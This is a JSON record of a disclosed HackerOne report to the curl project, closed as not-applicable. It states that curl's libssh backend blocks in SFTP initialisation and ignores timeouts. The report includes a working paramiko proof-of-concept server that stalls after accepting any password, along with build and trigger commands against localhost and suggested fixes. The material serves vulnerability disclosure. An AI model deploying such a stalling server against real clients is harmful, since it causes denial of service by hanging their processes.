@@ -1,0 +1,106 @@
+{
+  "id": 3735080,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzM1MDgw",
+  "url": "https://hackerone.com/reports/3735080",
+  "title": "libssh SFTP initialization ignores CURLOPT_TIMEOUT, hangs indefinitely",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "readable_substate": "N/A",
+  "created_at": "2026-05-14T11:14:40.676Z",
+  "submitted_at": "2026-05-14T11:14:41.213Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "giant_anteater",
+    "url": "/giant_anteater",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-05-18T13:25:04.377Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-05-15T21:56:22.061Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi all,\n\nThe libssh backend in `lib/vssh/libssh.c` ignores `CURLOPT_TIMEOUT` / `--max-time` during SFTP subsystem negotiation. A server that completes SSH authentication and then stalls before answering the `SSH_FXP_INIT` packet will pin the curl process indefinitely — no timeout fires, no error is returned, and the process must be killed externally. The libssh2 backend has no such problem.\n\nThe short version: `myssh_in_SFTP_INIT` (lines 1288–1309) calls `ssh_set_blocking(session, 1)` and then immediately calls `sftp_init()`, which blocks inside the libssh event loop waiting for the server's `SSH_FXP_VERSION` reply. The timeout check in `myssh_block_statemach` lives *after* `myssh_statemachine` returns — so if `sftp_init()` never returns, `Curl_timeleft_ms` is never reached. The libssh session also has no `SSH_OPTIONS_TIMEOUT` set anywhere in the file, so there is no fallback timeout at the libssh layer either.\n\nThe blocking sequence is right there in the source, lines 1288–1309:\n\n```c\nstatic int myssh_in_SFTP_INIT(struct Curl_easy *data,\n                              struct ssh_conn *sshc)\n{\n  int rc;\n  ssh_set_blocking(sshc->ssh_session, 1);          /* blocking ON */\n\n  sshc->sftp_session = sftp_new(sshc->ssh_session); /* blocking */\n  if(!sshc->sftp_session) {\n    failf(data, \"Failure initializing sftp session: %s\",\n          ssh_get_error(sshc->ssh_session));\n    return myssh_to_ERROR(data, sshc, CURLE_COULDNT_CONNECT);\n  }\n\n  rc = sftp_init(sshc->sftp_session);              /* blocks here indefinitely */\n  if(rc != SSH_OK) {\n    failf(data, \"Failure initializing sftp session: %s\",\n          ssh_get_error(sshc->ssh_session));\n    return myssh_to_ERROR(data, sshc, sftp_error_to_CURLE(SSH_FX_FAILURE));\n  }\n  myssh_to(data, sshc, SSH_SFTP_REALPATH);\n  return SSH_NO_ERROR;\n}\n```\n\nThis is a deliberate contradiction with the session-start code at line 692–694, which sets the session non-blocking explicitly with a comment explaining why:\n\n```c\n/* Set libssh to non-blocking, since everything internally is\n   non-blocking */\nssh_set_blocking(sshc->ssh_session, 0);\n```\n\n`myssh_in_SFTP_INIT` overrides that unconditionally and provides no escape hatch. A quick grep confirms no `SSH_OPTIONS_TIMEOUT` is ever set on the session in the entire file:\n\n```\n$ grep SSH_OPTIONS_TIMEOUT lib/vssh/libssh.c\n(no output)\n```\n\nThe timeout check itself lives in `myssh_block_statemach` (lines 2437–2473) and looks correct in isolation — the problem is that it only runs after `myssh_statemachine` returns:\n\n```c\nwhile((sshc->state != SSH_STOP) && !result) {\n  bool block;\n  timediff_t left_ms = 1000;\n\n  result = myssh_statemachine(data, sshc, sshp, &block); /* hangs here at SSH_SFTP_INIT */\n  if(result)\n    break;\n\n  if(!disconnect) {\n    result = Curl_pgrsCheck(data);\n    if(result)\n      break;\n\n    left_ms = Curl_timeleft_ms(data);   /* never reached while sftp_init() is blocked */\n    if(left_ms < 0) {\n      failf(data, \"Operation timed out\");\n      return CURLE_OPERATION_TIMEDOUT;\n    }\n  }\n  ...\n}\n```\n\nCompare this to the libssh2 backend in `lib/vssh/libssh2.c`. It sets the session non-blocking once at startup (line 1440) and never reverts it. The SFTP init handler at lines 1779–1799 then just tries the allocation, and if the server has not replied yet, it returns `CURLE_AGAIN` and yields back to the event loop:\n\n```c\nsshc->sftp_session = libssh2_sftp_init(sshc->ssh_session);\nif(!sshc->sftp_session) {\n    if(libssh2_session_last_errno(sshc->ssh_session) ==\n       LIBSSH2_ERROR_EAGAIN)\n      return CURLE_AGAIN;    /* yields; event loop checks Curl_timeleft_ms on next iteration */\n    ...\n}\n```\n\nThe libssh backend has no equivalent yield point for this state. Once `sftp_init()` is entered against a non-responding server, nothing can interrupt it short of the TCP connection being dropped.\n\nThe trigger sequence:\n\n1. Application sets `CURLOPT_TIMEOUT` or user passes `--max-time N`. The deadline is recorded in `Curl_timeleft_ms`.\n2. curl completes TCP and SSH handshake normally. The session runs non-blocking during key exchange and auth; timeouts work fine here.\n3. State machine reaches `SSH_SFTP_INIT`, dispatches to `myssh_in_SFTP_INIT`, which calls `ssh_set_blocking(…, 1)` then `sftp_init()`.\n4. Server has completed auth but withholds the `SSH_FXP_VERSION` reply. `sftp_init()` blocks in the libssh event loop.\n5. Control never returns to `myssh_statemachine`, so `myssh_block_statemach` never reaches `Curl_timeleft_ms`.\n6. No libssh-level timeout fires either since `SSH_OPTIONS_TIMEOUT` was never set.\n7. Process is frozen indefinitely. `CURLOPT_TIMEOUT`, `CURLOPT_CONNECTTIMEOUT`, `--max-time`, `--connect-timeout` are all inoperative for this phase.\n\nWe have a reproducer. The PoC server is a small paramiko script that completes SSH auth normally and then accepts the SFTP subsystem channel at the SSH-transport layer, but never sends the `SSH_FXP_VERSION` response — exactly what a stalled or adversarial SFTP daemon would do:\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nF29 PoC: paramiko SSH server that stalls SFTP subsystem initialization.\n\nThe server completes SSH authentication normally but, when the client\nopens a channel and sends a 'sftp' subsystem request, it accepts the\nchannel and then sleeps forever without returning an SFTP subsystem\nresponse.  When curl (libssh backend) calls sftp_init(), the blocking\ncall inside myssh_in_SFTP_INIT() waits indefinitely, bypassing\nCURLOPT_TIMEOUT / --max-time.\n\nUsage:\n    pip install paramiko\n    python3 F29_server.py &\n    curl --max-time 3 -v sftp://user:pass@127.0.0.1:2222/file\n\nExpected (buggy) behaviour with libssh build: curl hangs past 3 s.\nExpected behaviour with libssh2 build: curl exits with error 28\n(CURLE_OPERATION_TIMEDOUT) within ~3 s.\n\nGenerate a throwaway RSA host key with:\n    python3 -c \"\n    from paramiko import RSAKey\n    k = RSAKey.generate(2048)\n    k.write_private_key_file('/tmp/f29_host_rsa')\n    \"\n\"\"\"\n\nimport socket\nimport threading\nimport time\nimport sys\n\ntry:\n    import paramiko\nexcept ImportError:\n    sys.exit(\"paramiko is required: pip install paramiko\")\n\nHOST_KEY_PATH = \"/tmp/f29_host_rsa\"\nLISTEN_HOST = \"127.0.0.1\"\nLISTEN_PORT = 2222\nSTALL_SECONDS = 120  # stall well beyond any reasonable --max-time\n\n\ndef generate_host_key():\n    \"\"\"Generate a throwaway RSA host key if one does not already exist.\"\"\"\n    import os\n    if not os.path.exists(HOST_KEY_PATH):\n        print(f\"[*] Generating throwaway host key at {HOST_KEY_PATH}\")\n        key = paramiko.RSAKey.generate(2048)\n        key.write_private_key_file(HOST_KEY_PATH)\n    return paramiko.RSAKey(filename=HOST_KEY_PATH)\n\n\nclass StallingServerInterface(paramiko.ServerInterface):\n    \"\"\"Accept password auth for any user; stall on sftp subsystem.\"\"\"\n\n    def check_channel_request(self, kind, chanid):\n        if kind == \"session\":\n            return paramiko.OPEN_SUCCEEDED\n        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED\n\n    def check_auth_password(self, username, password):\n        # Accept any credentials so the test focuses on SFTP init stall.\n        print(f\"[*] Auth OK: user={username!r}\")\n        return paramiko.AUTH_SUCCESSFUL\n\n    def check_auth_none(self, username):\n        return paramiko.AUTH_FAILED\n\n    def get_allowed_auths(self, username):\n        return \"password\"\n\n    def check_channel_subsystem_request(self, channel, name):\n        if name == \"sftp\":\n            print(f\"[*] SFTP subsystem requested — stalling for {STALL_SECONDS}s \"\n                  f\"(never sending subsystem response)\")\n            # Spawn a thread that does nothing, simulating a server that\n            # accepted the channel but never responds to the SFTP subsystem\n            # open.  The channel object is intentionally not used.\n            def _stall():\n                time.sleep(STALL_SECONDS)\n            threading.Thread(target=_stall, daemon=True).start()\n            # Return True so paramiko marks the request accepted at the\n            # SSH-transport layer; the SFTP layer response is then withheld\n            # by never sending data on the channel.\n            return True\n        return False\n\n\ndef handle_client(client_sock, host_key):\n    transport = paramiko.Transport(client_sock)\n    transport.add_server_key(host_key)\n    server = StallingServerInterface()\n    try:\n        transport.start_server(server=server)\n        # Wait long enough for curl to time out (or not).\n        chan = transport.accept(timeout=STALL_SECONDS + 10)\n        if chan:\n            time.sleep(STALL_SECONDS)\n    except Exception as exc:\n        print(f\"[!] Transport error: {exc}\")\n    finally:\n        transport.close()\n        client_sock.close()\n\n\ndef main():\n    host_key = generate_host_key()\n\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.bind((LISTEN_HOST, LISTEN_PORT))\n    sock.listen(5)\n    print(f\"[*] Listening on {LISTEN_HOST}:{LISTEN_PORT}\")\n    print(f\"[*] Test command:\")\n    print(f\"    curl --max-time 3 -v sftp://user:pass@{LISTEN_HOST}:{LISTEN_PORT}/file\")\n    print(f\"[*] With a libssh-built curl, the command will hang past 3 s.\")\n    print(f\"[*] With a libssh2-built curl, it will exit with error 28 (CURLE_OPERATION_TIMEDOUT).\")\n\n    while True:\n        try:\n            client_sock, addr = sock.accept()\n            print(f\"[*] Connection from {addr}\")\n            t = threading.Thread(\n                target=handle_client, args=(client_sock, host_key), daemon=True\n            )\n            t.start()\n        except KeyboardInterrupt:\n            print(\"\\n[*] Shutting down.\")\n            break\n\n    sock.close()\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\nTo reproduce, build curl with libssh support (it is not the default — the standard autotools and CMake builds do not enable it; `USE_LIBSSH` must be opted into explicitly with `--with-libssh`):\n\n```\nsudo apt-get install libssh-dev\nautoreconf -fi\n./configure --with-libssh --without-libssh2 --with-openssl \\\n            --disable-shared --enable-debug --enable-maintainer-mode\nmake -j$(nproc)\n./src/curl --version | grep -i libssh\n```\n\nGenerate a throwaway host key, start the stalling server, and trigger:\n\n```\npip install paramiko\npython3 -c \"\nfrom paramiko import RSAKey\nk = RSAKey.generate(2048)\nk.write_private_key_file('/tmp/f29_host_rsa')\n\"\npython3 F29_server.py &\ntime ./src/curl --max-time 3 -v -o /dev/null --insecure \\\n    sftp://user:pass@127.0.0.1:2222/file\n```\n\nCurl invocation:\n\n```\ncurl --max-time 3 -v sftp://user:pass@127.0.0.1:2222/file\n```\n\nExpected (with libssh-built curl): returns error 28 (`CURLE_OPERATION_TIMEDOUT`) after 3 seconds.\n\nActual (with libssh-built curl): hangs indefinitely past 3 seconds; must be killed externally.\n\nWith the libssh build curl prints \"Initializing SFTP session\" and then hangs. The `time` wrapper will show wall-clock time growing well past 3 seconds with no timeout error; the process must be killed with Ctrl-C. With a libssh2 build the same command exits in approximately 3 seconds with:\n\n```\ncurl: (28) Operation timed out after 3001 milliseconds\n```\n\nExit code 28 (`CURLE_OPERATION_TIMEDOUT`).\n\nTwo complementary fixes. The minimal safe one is setting `SSH_OPTIONS_TIMEOUT` in the session setup block (around line 2548) so that libssh itself enforces the transfer deadline:\n\n```c\nlong timeout_ms = (long)Curl_timeleft_ms(data);\nif(timeout_ms > 0) {\n  long timeout_s = (timeout_ms + 999) / 1000;  /* round up */\n  ssh_options_set(sshc->ssh_session, SSH_OPTIONS_TIMEOUT, &timeout_s);\n}\n```\n\nThe cleaner long-term fix is removing `ssh_set_blocking(…, 1)` from `myssh_in_SFTP_INIT` entirely and letting the non-blocking session return `SSH_AGAIN` so that `myssh_block_statemach` can loop back and check `Curl_timeleft_ms` — the same pattern libssh2 already uses. The same `ssh_set_blocking(…, 1)` pattern appears at lines 1784 and 2163 of the same file and is worth reviewing for the same reason.\n\nThank you,\nAISLE Research Team\n\n## Impact\n\nA malicious or stalled SFTP server can cause libcurl builds that use the libssh backend to ignore CURLOPT_TIMEOUT and --max-time during SFTP subsystem setup, leaving the process hung indefinitely until it is killed externally. The impact is denial of service and resource exhaustion rather than memory corruption, and it is limited to non-default curl builds that were explicitly compiled with libssh support.",
+  "weakness": {
+    "id": 120,
+    "name": "Allocation of Resources Without Limits or Throttling"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
